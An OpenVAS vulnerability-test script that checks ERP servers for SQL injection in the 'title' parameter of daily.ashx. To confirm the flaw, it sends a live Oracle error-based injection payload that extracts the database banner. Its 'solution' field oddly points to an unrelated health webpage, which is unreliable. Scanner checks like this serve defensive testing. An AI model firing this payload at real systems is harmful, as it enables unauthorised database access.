##############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_entrps_resrce_plan_sql_inj_vuln.nasl 12 2013-10-27 11:15:33Z jan $
#
# ERP (Enterprise Resource Planning) System SQL Injection Vulnerability
#
# Authors:
# Antu Sanadi <santu@secpod.com>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation will allow remote attackers to compromise the
  application, access or modify data or exploit vulnerabilities in the
  underlying database.
  Impact Level: Application";
tag_affected = "ERP Enterprise Resource Planning";
tag_insight = "Improper validation of user-supplied input passed via the 'title' parameter
  to '/Portal/WUC/daily.ashx', which allows attacker to  manipulate SQL queries
  by injecting arbitrary SQL code.";
tag_solution = "No solution or patch is available as of 31st December, 2012. Information
  regarding this issue will be updated once the solution details are available.
  For updates refer to http://www.doctissimo.fr/html/dossiers/sida/sida.htm";
tag_summary = "This host is installed with Enterprise Resource Planning and is
  prone to SQL injection vulnerability.";

if(description)
{
  script_id(803137);
  script_version("$Revision: 12 $");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"risk_factor", value:"High");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 12:15:33 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2012-12-31 13:34:48 +0530 (Mon, 31 Dec 2012)");
  script_name("ERP (Enterprise Resource Planning) System SQL Injection Vulnerability");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;
  script_xref(name : "URL" , value : "http://packetstormsecurity.com/files/119157/erp-sql.txt");

  script_description(desc);
  script_summary("Check if ERP is vulnerable to SQL injection");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (c) 2012 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_require_ports("Services/www", 80);
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");

## Variable Initialization
dir = "";
url = "";
port = 0;

## Get HTTP Port
port = get_http_port(default:80);
if(!port){
  port = 80;
}

if(!get_port_state(port)){
 exit(0);
}

## Iterate over possible paths
foreach dir(make_list("", "/erp", cgi_dirs()))
{

  url = dir + "/";

  ## Confirm the application before trying exploit
  if(http_vuln_check(port: port, url: url, check_header: TRUE,
                     pattern: ">  erp  <"))
  {
    ## Construct attack request
    url = dir +  "/Portal/WUC/daily.ashx?title='or%201=utl_inaddr." +
          "get_host_address((select%20banner%20from%20v$version%20" +
          "where%20rownum=1))--";

    ## Try exploit and check the response to confirm vulnerability
    if(http_vuln_check(port:port, url:url, pattern:'SYS.UTL_INADDR',
     extra_check: make_list("Oracle Database", "SYS.UTL_INADDR",
                            "daily.ProcessRequest")))
    {
      security_hole(port);
      exit(0);
    }
  }
}
